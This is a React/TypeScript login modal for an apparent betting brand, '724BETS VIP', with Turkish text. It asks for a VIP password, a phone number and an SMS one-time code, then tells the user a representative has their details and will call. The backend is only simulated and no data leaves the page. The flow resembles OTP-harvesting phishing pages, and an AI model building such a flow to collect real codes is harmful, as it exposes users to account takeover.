import React, { useState, useEffect } from 'react';
import { X, Lock, Phone, MessageSquare, CheckCircle, ArrowRight, ShieldCheck, Crown, Loader2 } from 'lucide-react';

interface VipLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
}

type Step = 'CREDENTIALS' | 'SMS' | 'SUCCESS';

const VipLoginModal: React.FC<VipLoginModalProps> = ({ isOpen, onClose }) => {
  const [step, setStep] = useState<Step>('CREDENTIALS');
  const [loading, setLoading] = useState(false);
  const [vipCode, setVipCode] = useState('');
  const [phone, setPhone] = useState('');
  const [smsCode, setSmsCode] = useState('');

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setStep('CREDENTIALS');
      setVipCode('');
      setPhone('');
      setSmsCode('');
      setLoading(false);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  const handleNextStep = (nextStep: Step) => {
    setLoading(true);
    // Simulate network request delay
    setTimeout(() => {
      setLoading(false);
      setStep(nextStep);
    }, 1200);
  };

  const renderContent = () => {
    switch (step) {
      case 'CREDENTIALS':
        return (
          <div className="flex flex-col animate-in fade-in slide-in-from-bottom-4 duration-500">
            <div className="w-20 h-20 rounded-full bg-gradient-to-br from-cyan-400 to-cyan-600 p-[2px] mb-6 mx-auto shadow-[0_0_40px_rgba(6,182,212,0.3)]">
              <div className="w-full h-full bg-[#0A0C10] rounded-full flex items-center justify-center border-4 border-[#050505]">
                 <ShieldCheck className="text-cyan-400" size={32} />
              </div>
            </div>
            <h3 className="text-3xl font-black text-center text-transparent bg-clip-text bg-gradient-to-b from-[#ECFEFF] via-[#67E8F9] to-[#0891B2] mb-2 drop-shadow-sm tracking-tight">VIP Kimlik Doğrulama</h3>
            <p className="text-zinc-400 text-center text-[13px] mb-8 leading-relaxed px-4">
              Güvenliğiniz için <strong className="text-white">VIP Şifrenizi</strong> ve kayıtlı <strong className="text-white">Telefon Numaranızı</strong> girerek işleme devam edin.
            </p>
            
            <div className="flex flex-col gap-4 mb-8">
              {/* VIP Code Input */}
              <div className="relative group">
                <div className="absolute inset-0 bg-gradient-to-r from-cyan-500/0 via-cyan-500/10 to-cyan-500/0 rounded-xl opacity-0 group-focus-within:opacity-100 transition-opacity pointer-events-none"></div>
                <div className="absolute left-5 top-1/2 -translate-y-1/2 text-cyan-600/80 group-focus-within:text-cyan-400 transition-colors">
                  <Lock size={18} />
                </div>
                <input 
                  type="password" 
                  value={vipCode}
                  onChange={(e) => setVipCode(e.target.value)}
                  placeholder="Özel VIP Şifreniz" 
                  className="w-full bg-[#0A0A0A] border border-white/10 focus:border-cyan-500/50 rounded-xl pl-12 pr-5 py-4 text-white font-bold tracking-widest text-lg outline-none transition-all placeholder:text-zinc-600 shadow-[inset_0_2px_4px_rgba(0,0,0,0.5)]"
                />
              </div>

              {/* Phone Input */}
              <div className="relative group">
                <div className="absolute inset-0 bg-gradient-to-r from-cyan-500/0 via-cyan-500/10 to-cyan-500/0 rounded-xl opacity-0 group-focus-within:opacity-100 transition-opacity pointer-events-none"></div>
                <div className="absolute left-5 top-1/2 -translate-y-1/2 flex items-center gap-2 text-cyan-600/80 group-focus-within:text-cyan-400 transition-colors">
                  <Phone size={18} />
                  <span className="text-zinc-400 font-black text-[15px] border-r border-white/10 pr-2">+90</span>
                </div>
                <input 
                  type="tel" 
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  placeholder="5XX XXX XX XX" 
                  className="w-full bg-[#0A0A0A] border border-white/10 focus:border-cyan-500/50 rounded-xl pl-24 pr-5 py-4 text-white font-bold tracking-widest text-lg outline-none transition-all placeholder:text-zinc-600 shadow-[inset_0_2px_4px_rgba(0,0,0,0.5)]"
                />
              </div>
            </div>

            <button 
              onClick={() => handleNextStep('SMS')}
              disabled={vipCode.length < 3 || phone.length < 10 || loading}
              className="w-full bg-gradient-to-b from-cyan-400 to-cyan-700 text-[#042F2E] py-4 rounded-xl font-black uppercase tracking-widest text-[14px] shadow-[inset_0_1px_0_rgba(255,255,255,0.4),0_8px_20px_rgba(8,145,178,0.4)] hover:brightness-110 disabled:opacity-50 disabled:grayscale transition-all flex items-center justify-center gap-2 group/btn border border-cyan-300/30 relative overflow-hidden"
            >
              {loading ? (
                <Loader2 className="animate-spin text-[#042F2E]" size={22} />
              ) : (
                <>
                  <span className="relative z-10 drop-shadow-sm">DOĞRULA & SMS GÖNDER</span>
                  <ArrowRight size={18} className="relative z-10 group-hover/btn:translate-x-1 transition-transform drop-shadow-sm" />
                </>
              )}
              <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/40 to-white/0 -translate-x-full group-hover/btn:animate-[shimmer_1.2s_infinite]"></div>
            </button>
          </div>
        );

      case 'SMS':
        return (
          <div className="flex flex-col animate-in fade-in slide-in-from-right-8 duration-500">
            <div className="w-20 h-20 rounded-full bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center mb-6 mx-auto shadow-[0_0_30px_rgba(6,182,212,0.2)]">
              <MessageSquare className="text-cyan-400" size={32} />
            </div>
            <h3 className="text-3xl font-black text-center text-transparent bg-clip-text bg-gradient-to-b from-[#ECFEFF] via-[#67E8F9] to-[#0891B2] mb-2 drop-shadow-sm tracking-tight">SMS Doğrulama</h3>
            <p className="text-zinc-400 text-center text-[14px] mb-8 leading-relaxed">
              <strong className="text-white">+90 {phone}</strong> numaralı telefonunuza gönderilen 6 haneli doğrulama kodunu girin.
            </p>
            <div className="relative mb-8">
              <input 
                type="text" 
                value={smsCode}
                onChange={(e) => setSmsCode(e.target.value)}
                placeholder="• • • • • •" 
                maxLength={6}
                className="w-full bg-[#0A0A0A] border border-white/10 focus:border-cyan-500/50 rounded-xl px-5 py-5 text-white font-black tracking-[1em] text-center text-3xl outline-none transition-all placeholder:text-zinc-600 shadow-[inset_0_2px_4px_rgba(0,0,0,0.5)]"
              />
            </div>
            <button 
              onClick={() => handleNextStep('SUCCESS')}
              disabled={smsCode.length < 6 || loading}
              className="w-full bg-gradient-to-b from-cyan-400 to-cyan-700 text-[#042F2E] py-4 rounded-xl font-black uppercase tracking-widest text-[15px] shadow-[inset_0_1px_0_rgba(255,255,255,0.4),0_8px_20px_rgba(8,145,178,0.4)] hover:brightness-110 disabled:opacity-50 disabled:grayscale transition-all flex items-center justify-center gap-2 group/btn border border-cyan-300/30 relative overflow-hidden"
            >
              {loading ? <Loader2 className="animate-spin text-[#042F2E]" size={22} /> : <>SİSTEME GİRİŞ YAP <CheckCircle size={18} className="drop-shadow-sm"/></>}
              <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/40 to-white/0 -translate-x-full group-hover/btn:animate-[shimmer_1.2s_infinite]"></div>
            </button>
          </div>
        );

      case 'SUCCESS':
        return (
          <div className="flex flex-col items-center animate-in zoom-in-95 duration-500">
            <div className="w-24 h-24 rounded-full bg-[#00E5FF]/20 border border-emerald-500/30 flex items-center justify-center mb-6 shadow-[0_0_50px_rgba(16,185,129,0.3)] relative">
              <div className="absolute inset-0 rounded-full border border-emerald-400 animate-ping opacity-20"></div>
              <ShieldCheck className="text-[#00E5FF]" size={48} />
            </div>
            <h3 className="text-3xl font-black text-center text-white mb-4 drop-shadow-md">Kimlik Doğrulandı</h3>
            <div className="bg-[#00E5FF]/10 border border-emerald-500/20 rounded-xl p-6 text-center w-full">
              <p className="text-emerald-300 font-bold text-[16px] mb-2">
                Sayın VIP Üyemiz,
              </p>
              <p className="text-zinc-300 text-[15px] leading-relaxed">
                Özel temsilciniz bilgilerinizi aldı.<br/>
                <span className="text-white font-black">Hemen sizi arıyoruz...</span>
              </p>
            </div>
            
            <div className="mt-8 flex items-center gap-3 text-zinc-500 text-[12px] uppercase font-bold tracking-widest">
              <Loader2 className="animate-spin" size={14} /> Güvenli Bağlantı Bekleniyor
            </div>
          </div>
        );
    }
  };

  return (
    <div className="fixed inset-0 z-[9999] flex items-center justify-center p-4">
      {/* Backdrop */}
      <div 
        className="absolute inset-0 bg-black/80 backdrop-blur-md animate-in fade-in duration-300"
        onClick={onClose}
      />
      
      {/* Modal Content */}
      <div className="relative w-full max-w-[440px] bg-[#0A0C10] border border-white/10 rounded-3xl shadow-[0_20px_60px_rgba(0,0,0,0.8),inset_0_1px_1px_rgba(255,255,255,0.05)] overflow-hidden animate-in zoom-in-95 fade-in duration-300">
        
        {/* Header decoration */}
        <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#A5F3FC] via-[#0891B2] to-[#A5F3FC]"></div>
        <div className="absolute top-[-50px] right-[-50px] w-[150px] h-[150px] bg-cyan-500/10 rounded-full blur-[40px] pointer-events-none"></div>

        {/* Close Button */}
        <button 
          onClick={onClose}
          className="absolute top-4 right-4 w-8 h-8 flex items-center justify-center rounded-full bg-white/5 hover:bg-white/10 text-zinc-400 hover:text-white transition-colors z-20"
        >
          <X size={18} />
        </button>

        {/* Internal Padding */}
        <div className="px-8 py-10 relative z-10">
          
          {/* Top Logo / Crown */}
          {step !== 'SUCCESS' && (
            <div className="flex justify-center mb-6">
              <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-cyan-500/10 border border-cyan-500/20">
                <Crown size={12} className="text-cyan-400" />
                <span className="text-[10px] font-black tracking-widest text-cyan-400 uppercase">724BETS VIP</span>
              </div>
            </div>
          )}

          {renderContent()}

        </div>
      </div>
    </div>
  );
};

export default VipLoginModal;
